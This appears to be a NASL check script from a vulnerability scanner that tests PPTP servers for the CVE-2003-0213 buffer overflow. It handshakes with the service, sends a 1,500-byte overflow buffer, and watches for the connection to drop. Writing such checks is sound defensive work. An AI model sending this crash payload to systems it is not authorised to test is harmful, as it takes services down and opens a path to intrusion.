if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.11540" );
	script_version( "2019-04-24T07:26:10+0000" );
	script_tag( name: "last_modification", value: "2019-04-24 07:26:10 +0000 (Wed, 24 Apr 2019)" );
	script_tag( name: "creation_date", value: "2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)" );
	script_bugtraq_id( 7316 );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_name( "PPTP overflow" );
	script_xref( name: "SuSE", value: "SUSE-SA:2003:029" );
	script_cve_id( "CVE-2003-0213" );
	script_category( ACT_ATTACK );
	script_family( "Gain a shell remotely" );
	script_copyright( "This script is Copyright (C) 2003 Xue Yong Zhi" );
	script_dependencies( "pptp_detect.sc" );
	script_require_ports( "Services/pptp", 1723 );
	script_tag( name: "solution", value: "The vendor has released updated releases of
  PPTP server which address this issue. Users are advised to upgrade as soon as possible." );
	script_tag( name: "summary", value: "The remote PPTP server has remote buffer overflow vulnerability." );
	script_tag( name: "insight", value: "The problem occurs due to insufficient sanity checks when referencing
  user-supplied input used in various calculations. As a result, it may be possible for an attacker to
  trigger a condition where sensitive memory can be corrupted." );
	script_tag( name: "impact", value: "Successful exploitation of this issue may allow an attacker to
  execute arbitrary code with the privileges of the affected server." );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "VendorFix" );
	exit( 0 );
}
require("misc_func.inc.sc");
require("byte_func.inc.sc");
port = get_kb_item( "Services/pptp" );
if(!port){
	exit( 0 );
}
soc = open_sock_tcp( port );
if(!soc){
	exit( 0 );
}
set_byte_order( BYTE_ORDER_BIG_ENDIAN );
pptp_head = mkword( 1 ) + mkdword( 0x1a2b3c4d ) + mkword( 1 ) + mkword( 0 ) + mkword( 0x0100 ) + mkword( 0 ) + mkdword( 1 ) + mkdword( 1 ) + mkword( 0 );
pptp_vendor = mkword( 2320 ) + mkpad( 64 ) + mkpad( 64 );
buffer = mkword( strlen( pptp_head ) + strlen( pptp_vendor ) + 2 ) + pptp_head + pptp_vendor;
send( socket: soc, data: buffer );
r = recv( socket: soc, length: 2 );
if(!r || strlen( r ) != 2){
	close( soc );
	exit( 0 );
}
l = getword( blob: r, pos: 0 );
r += recv( socket: soc, length: l - 2, min: l - 2 );
close( soc );
if(strlen( r ) != l){
	exit( 0 );
}
if(strlen( r ) < strlen( pptp_head ) + strlen( pptp_vendor )){
	exit( 0 );
}
cookie = getdword( blob: r, pos: 4 );
if(cookie != 0x1a2b3c4d){
	exit( 0 );
}
soc = open_sock_tcp( port );
if(!soc){
	exit( 0 );
}
send( socket: soc, data: buffer );
rec_buffer = recv( socket: soc, length: 156 );
close( soc );
if(!ContainsString( rec_buffer, "linux" )){
	exit( 0 );
}
buffer = raw_string( 0x00, 0x00 ) + crap( length: 1500, data: "A" );
soc = open_sock_tcp( port );
if(!soc){
	exit( 0 );
}
send( socket: soc, data: buffer );
filter = NASLString( "tcp and src host ", get_host_ip(), " and dst host ", this_host(), " and src port ", port, " and dst port ", get_source_port( soc ), " and tcp[13:1]&1!=0 " );
for(i = 0;i < 5;i++){
	r = pcap_next( pcap_filter: filter, timeout: 2 );
	if(r){
		security_message( port: port );
		exit( 0 );
	}
}
exit( 99 );

